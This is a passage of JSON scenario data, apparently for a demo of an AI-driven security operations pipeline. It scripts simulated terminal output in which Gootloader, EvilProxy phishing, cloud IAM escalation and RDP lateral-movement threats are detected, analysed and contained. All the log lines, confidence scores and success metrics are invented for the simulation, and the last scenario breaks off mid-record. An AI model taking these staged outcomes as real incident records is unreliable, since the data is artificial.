+        "text": "[BRAIN]   \u251c\u2500 C2 beacon pattern: check-in interval = 47min (Gootloader default)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Execution status: NOT YET EXECUTED (download only)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Window of opportunity: payload downloaded but not executed",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended: remove-payload + block-c2 + user-awareness",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE | Priority: HIGH (pre-detonation)",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 Payload Neutralization \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: neutralize-seo-payload v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/4: quarantine_file",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: defender_api | action: quarantine employee_agreement_template.js",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 File quarantined before execution",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/4: scan_downloads_folder",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: crowdstrike_rtr | action: recursive scan C:\\Users\\*\\Downloads\\",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 No additional Gootloader artifacts found",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/4: block_c2_domains",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: dns_firewall | action: sinkhole Gootloader IOCs",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 4 domains sinkholed | IOC feed updated",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 4/4: user_notification",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: teams | action: notify user + security awareness link",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 User notified via Teams with phishing awareness material",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE NERVOUS SYSTEM \u2014 Domain & URL Blocking \u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving SEO poisoning enforcement...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing session block...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 Web proxy: compromised-legal-docs[.]com \u2192 BLOCKED \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 DNS: 4 Gootloader C2 domains \u2192 sinkholed \u2713",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 URL filtering: .js downloads from unknown sites \u2192 WARNED \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SCENARIO COMPLETE: Gootloader SEO Poisoning             \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Payload Status: Quarantined (pre-detonation)              \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   C2 Domains: 4 sinkholed | User: Notified                  \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced. No production systems affected.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Analyzing Web Proxy...",
+      "body_done": "Gootloader Found",
+      "brain_active": "Deobfuscating JS...",
+      "brain_done": "Pre-Detonation!",
+      "purpose_active": "Quarantining File...",
+      "purpose_done": "Payload Neutralized",
+      "edge_active": "Sinkholing C2...",
+      "edge_done": "Domains Blocked"
+    },
+    "success_metrics": "Payload: Quarantined Pre-Detonation | C2 Domains: 4 Sinkholed | User: Notified"
+  },
+  "pkg-006": {
+    "id": "pkg-006",
+    "pkg_id": "pkg-006",
+    "title": "EvilProxy Credential Harvest",
+    "subtitle": "Phishing kit deployment \u2192 credential capture \u2192 account takeover via EvilProxy",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: EVILPROXY CREDENTIAL HARVEST \u2014 pkg-006          \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   Phishing Kit \u2192 Credential Capture \u2192 Account Takeover      \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: EvilProxy Credential Harvest",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: FIN-HARVEST (Credential Theft Group)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1598, T1566.002, T1056.004",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: Email gateway, Web proxy, DNS query logs",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic credential data",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Email & Web Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Email gateway alert: Suspicious link in inbound message",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Subject: \"Urgent: Verify your account credentials\"",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Sender: noreply@c0rp-auth.top (domain age: 2 days)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Link: https://c0rp-auth.top/login/verify?token=abc123",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-CRED-HARVEST-a4f2c1",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Domain c0rp-auth.top \u2192 newly registered (48h)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Certificate: Let's Encrypt wildcard (common in phish kits)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Page structure: EvilProxy template fingerprint detected",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Form action: POST /collect \u2192 credential exfil endpoint",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] DNS query: c0rp-auth.top \u2192 185.234.xx.xx (known bulletproof hosting)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = HIGH | phishing_kit = EvilProxy v3.2",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Detection hash: BODY-CRED-HARVEST-a4f2c19e7d",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-CRED-HARVEST-a4f2c19e7d...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Prompt injection scan: CLEAN \u2713",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Analyzing phishing infrastructure...",
+        "type": "info"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Domain typosquat similarity: 94% match to corp-auth.com",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 SSL cert: wildcard *.c0rp-auth.top (Let's Encrypt)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 EvilProxy kit signature: HTML form + JS keylogger",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Credential exfil: POST to /collect with base64 encoding",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 3 users clicked link in past 15 minutes",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 89% \u2192 96% (kit fingerprint + domain intel)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: credential-harvest-response v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "[BRAIN] Audit hash: sha256:c7d4e1... | Immutable log stored",
+        "type": "brain"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: credential-harvest-response v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] apiVersion: claw.soac.io/v1 | kind: Playbook",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] severity: HIGH | mitre_attack: [T1598, T1566.002, T1056.004]",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Trigger matched: detection_type=credential_harvest_phishing",
+        "type": "purpose"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Step 1/3: block_phishing_domain",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: block_domain c0rp-auth.top",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Domain blocked across all edge nodes",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: reset_affected_credentials",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: BODY | action: force_password_reset (3 users)",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Password reset forced for j.smith, m.jones, k.lee",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: submit_iocs",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: INTERNAL | action: submit IOCs to threat intel",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 Domain, IP, cert hash submitted to TIP",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Receiving enforcement from CLAW playbook...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Verifying HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] Enforcing domain block: c0rp-auth.top",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-us-east-1: DNS sinkhole ENFORCED \u2713 (3ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 edge-eu-west-1: DNS sinkhole ENFORCED \u2713 (41ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 edge-ap-south-1: DNS sinkhole ENFORCED \u2713 (78ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE] Email gateway: Quarantined 12 additional messages from c0rp-auth.top",
+        "type": "edge"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   Phishing kit neutralized in 6.2s | 3 users protected     \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Analyzing phishing kit...",
+      "body_done": "Kit Fingerprinted",
+      "brain_active": "Correlating threat intel...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Blocking + Resetting...",
+      "purpose_done": "Credentials Reset",
+      "edge_active": "Sinkholing domain...",
+      "edge_done": "Domain Blocked"
+    },
+    "success_metrics": "Time to Block: 6.2s | Users Protected: 3 | IOCs Submitted: 4 | Emails Quarantined: 12"
+  },
+  "pkg-007": {
+    "id": "pkg-007",
+    "pkg_id": "pkg-007",
+    "title": "SolarStorm Cloud Privilege Escalation",
+    "subtitle": "IAM role chaining \u2192 cross-account pivot \u2192 privilege escalation via policy attachment",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: SOLARSTORM CLOUD PRIVESC \u2014 pkg-007              \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   IAM Role Chain \u2192 Cross-Account Pivot \u2192 Policy Escalation  \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: SolarStorm Cloud Privilege Escalation",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: SOLARSTORM (Cloud-Native APT)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1078.004, T1548, T1484",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: AWS CloudTrail, Azure Activity Log, GCP Admin",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic IAM data",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Cloud Audit Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] CloudTrail event: sts:AssumeRole from unusual source",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Principal: arn:aws:iam::123456789:role/dev-lambda-exec",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Target: arn:aws:iam::987654321:role/admin-cross-account",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-IAM-PRIVESC-b7e3d2",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 AssumeRole calls: 7 in 120 seconds (baseline: 1/hour)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Cross-account: dev \u2192 prod account pivot detected",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 AttachRolePolicy: AdministratorAccess attached",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u2514\u2500 Source IP: 203.0.113.99 (not in known CIDR)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] risk_score = CRITICAL | privilege_escalation_chain = 3 hops",
+        "type": "error"
+      },
+      {
+        "text": "[BODY] Forwarding to The Brain for analysis...",
+        "type": "info"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 2: THE BRAIN \u2014 AI Threat Analysis \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "brain",
+        "phase": 2
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BRAIN] Receiving detection BODY-IAM-PRIVESC-b7e3d2...",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Loading governance: ai_governance_baseline.yaml",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision authority: CRITICAL \u2192 brain_oversight REQUIRED",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Role chain: dev-lambda \u2192 staging-deploy \u2192 admin-cross",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Policy attachment: AdministratorAccess (over-privileged)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u251c\u2500 Source IP 203.0.113.99: VPN exit node, not employee range",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN]   \u2514\u2500 Blast radius: full admin on production account",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Confidence: 91% \u2192 97% (3-hop chain + admin policy attach)",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Recommended playbook: cloud-iam-privesc-containment v1.0.0",
+        "type": "brain"
+      },
+      {
+        "text": "[BRAIN] Decision: APPROVE execution",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 3: THE PURPOSE \u2014 CLAW Playbook Execution \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "purpose",
+        "phase": 3
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[CLAW] Loading: cloud-iam-privesc-containment v1.0.0",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW] Step 1/3: revoke_iam_sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: EDGE | action: revoke all active sessions",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 4 active sessions revoked for compromised role",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 2/3: detach_unauthorized_policies",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: BODY | action: DetachRolePolicy AdministratorAccess",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 AdministratorAccess policy detached from 2 roles",
+        "type": "success"
+      },
+      {
+        "text": "[CLAW] Step 3/3: audit_cross_account_trust",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   target: INTERNAL | action: enumerate trust policies",
+        "type": "purpose"
+      },
+      {
+        "text": "[CLAW]   \u2514\u2500 \u2713 3 overly permissive trust policies flagged",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 4: THE EDGE \u2014 Enforcement \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "edge",
+        "phase": 4
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[EDGE] Enforcing IAM session revocation...",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE] HMAC-SHA256 signature: VERIFIED \u2713",
+        "type": "edge"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 AWS us-east-1: Sessions revoked \u2713 (5ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u251c\u2500 AWS eu-west-1: Cross-account trust tightened \u2713 (12ms)",
+        "type": "success"
+      },
+      {
+        "text": "[EDGE]   \u2514\u2500 SCP: Deny sts:AssumeRole from 203.0.113.0/24 \u2713",
+        "type": "success"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   \u2713 SIMULATION COMPLETE                                    \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u2551   IAM escalation contained in 3.4s | Trust policies fixed  \u2551",
+        "type": "success"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "success"
+      },
+      {
+        "text": "[SYSTEM] Lab safety policy enforced: SIMULATE mode active.",
+        "type": "system"
+      }
+    ],
+    "graph_states": {
+      "body_active": "Detecting IAM anomaly...",
+      "body_done": "Escalation Detected",
+      "brain_active": "Analyzing role chain...",
+      "brain_done": "Decision: APPROVE",
+      "purpose_active": "Revoking sessions...",
+      "purpose_done": "Policies Detached",
+      "edge_active": "Tightening trust...",
+      "edge_done": "IAM Secured"
+    },
+    "success_metrics": "Time to Contain: 3.4s | Sessions Revoked: 4 | Policies Detached: 2 | Trust Policies Fixed: 3"
+  },
+  "pkg-008": {
+    "id": "pkg-008",
+    "pkg_id": "pkg-008",
+    "title": "BlueRelay Lateral Movement Campaign",
+    "subtitle": "RDP tunneling \u2192 pass-the-hash \u2192 lateral tool transfer across Windows domain",
+    "terminal_steps": [
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   SCENARIO: BLUERELAY LATERAL MOVEMENT \u2014 pkg-008            \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u2551   RDP Tunnel \u2192 Pass-the-Hash \u2192 Lateral Tool Transfer        \u2551",
+        "type": "header"
+      },
+      {
+        "text": "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d",
+        "type": "header"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[SYSTEM] Loading scenario: BlueRelay Lateral Movement Campaign",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Threat actor profile: BLUERELAY (Post-Compromise Operator)",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] MITRE ATT&CK: T1021.001, T1550.002, T1570",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Signals: Windows Security, Network flows, RDP logs",
+        "type": "system"
+      },
+      {
+        "text": "[SYSTEM] Lab safety: SIMULATE mode | Synthetic AD data",
+        "type": "system"
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "\u2501\u2501\u2501 PHASE 1: THE BODY \u2014 Windows & Network Telemetry \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        "type": "body",
+        "phase": 1
+      },
+      {
+        "text": "",
+        "type": "blank"
+      },
+      {
+        "text": "[BODY] Windows Security Event 4624: Network logon (Type 10 - RDP)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] Source: WKS-DEV-042 (10.1.5.42) \u2192 SRV-FILE-01 (10.1.10.11)",
+        "type": "body"
+      },
+      {
+        "text": "[BODY] \u26a1 Detection triggered: BODY-LATMOV-RDP-c8f1a3",
+        "type": "body"
+      },
+      {
+        "text": "[BODY]   \u251c\u2500 Event 4624: LogonType=10, AuthPkg=NTLM (not Kerberos)",
+        "type": "body"
+      },
+      {
